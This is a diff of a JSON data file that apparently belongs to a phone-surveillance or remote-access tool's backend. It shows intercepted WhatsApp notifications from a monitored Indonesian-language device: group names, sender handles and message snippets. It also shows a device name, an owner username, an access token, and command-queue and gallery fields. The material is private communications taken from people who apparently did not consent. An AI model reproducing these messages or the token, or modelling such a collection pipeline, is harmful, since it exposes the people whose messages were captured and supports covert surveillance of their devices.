@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1767 pesan dari 18 chat",
+        "time": "29/04 20:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777463676882
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (287 pesan): ~ Reyhannn",
+        "content": "Menyebut grup Anda secara privat di status",
+        "time": "29/04 20:05",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777463676861
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎TWOSTROKE JATIM V1 (21 pesan): ~ Erh⚡️ck",
         "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
         "time": "29/04 20:05",
@@ -4003,22 +4019,6 @@
         "time": "29/04 19:56",
         "pkg": "com.whatsapp",
         "receivedAt": 1777463161324
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗣𝗔𝗦𝗨𝗞𝗔𝗡 𝗣𝗘𝗡𝗚𝗛𝗬𝗧𝗔𝗠𝗔𝗡 (71 pesan): ~ paees nak tido",
-        "content": "💟 Stiker",
-        "time": "29/04 19:56",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777463160912
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (325 pesan): ~ kholo kur kur",
-        "content": "lucu bgt ni bocil",
-        "time": "29/04 19:56",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777463160864
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777463675790,
+    "lastSeen": 1777463684882,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
